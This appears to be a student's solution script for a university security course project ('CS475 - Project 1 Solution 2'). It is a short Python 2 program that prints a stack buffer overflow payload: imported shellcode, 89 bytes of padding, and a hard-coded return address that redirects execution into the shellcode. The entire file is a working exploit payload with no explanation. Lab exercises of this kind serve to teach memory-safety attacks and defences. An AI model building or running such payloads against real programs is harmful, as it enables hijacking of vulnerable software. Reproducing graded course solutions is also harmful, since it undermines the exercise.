#!/usr/bin/python
# CS475 - Project 1 Solution 2
#
from struct import pack
from shellcode import shellcode
print shellcode + "a"*89 + pack("<I",0xbffeb73c)

